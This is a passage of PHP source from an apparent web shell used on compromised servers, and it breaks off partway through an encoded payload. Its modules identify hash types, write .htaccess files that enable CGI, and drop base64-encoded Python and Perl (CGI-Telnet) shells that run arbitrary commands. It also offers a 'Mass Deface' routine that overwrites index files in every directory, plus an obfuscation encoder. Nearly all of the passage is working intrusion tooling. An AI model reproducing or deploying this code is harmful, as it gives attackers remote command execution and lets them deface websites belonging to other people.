			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	
	?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<tr>
		<table class="tabnet">
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
	
	<?php
 }
//////////////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'python')) { 
echo "<center/><br/><b>
 +--==[ python  Bypass Exploit ]==--+ 
 </b><br><br>";
 
 
    mkdir('python', 0755);
    chdir('python');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("python.izo",0755);
   echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
 
 </div>"; }

//////////////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'string')){
$text = $_POST['code'];
?><center><br><br><b>+--=[ Script Encode & Decode ]=--+</b><br><br>
<form method="post"><br><br><br>
<textarea class='inputz' cols=80 rows=10 name="code"></textarea><br><br>
<select class='inputz' size="1" name="ope">
<option value="base64">Base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
</select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
<input class='inputzbut' type='submit' name='submits' value='Decrypt'>
</form>

<?php 
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;default:break;}}

echo '<textarea cols=80 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><BR><BR>';

}

/////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'mass'))
{
echo "<center/><br/><b><font color=#00ff00>-=[ Mass Deface ]=-</font></b><br>";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="index.php"></td>
	</tr>
</tr>
<th colspan='2'><b>Index code</b></th><br></table>
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>HACKED BY X'1N73CT,PATCH YOUR SECURITY SYSTEM</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file > Done<br><br>";}}}

//////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'cgi')) { 
echo "<center/><br/><b><font color=blue>+--==[ cgitelnet.v1  Bypass Exploit]==--+ </font></b><br><br>";
 mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlO